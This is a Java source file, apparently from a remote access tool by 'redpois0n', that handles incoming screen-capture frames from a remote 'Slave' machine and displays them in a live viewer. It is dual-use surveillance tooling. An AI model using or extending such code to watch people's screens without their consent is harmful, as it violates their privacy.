package com.redpois0n.packets;

import java.awt.image.BufferedImage;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameQuickRemoteScreen;
import com.redpois0n.util.ImageUtils;

public class PacketQUICKDESKTOP extends Packet {

	@Override
	public void read(Slave slave, String header) throws Exception {
		FrameQuickRemoteScreen frame = FrameQuickRemoteScreen.instances.get(slave);
		
		int len = slave.readInt();
		
		byte[] buffer = new byte[len];
				
		slave.getDataInputStream().readFully(buffer);
		
		if (frame != null) {
			BufferedImage image = ImageUtils.decodeImage(buffer);
			
			frame.getImage().getGraphics().drawImage(image, 0, 0, frame.getImage().getWidth(), frame.getImage().getHeight(), null);
			
			frame.getLabel().repaint();
			
			frame.setSize(len / 1024);
			
			frame.getFPSThread().increase();
			
			if (frame.shouldContinue()) {
				frame.send();
			}
		}
	}

}
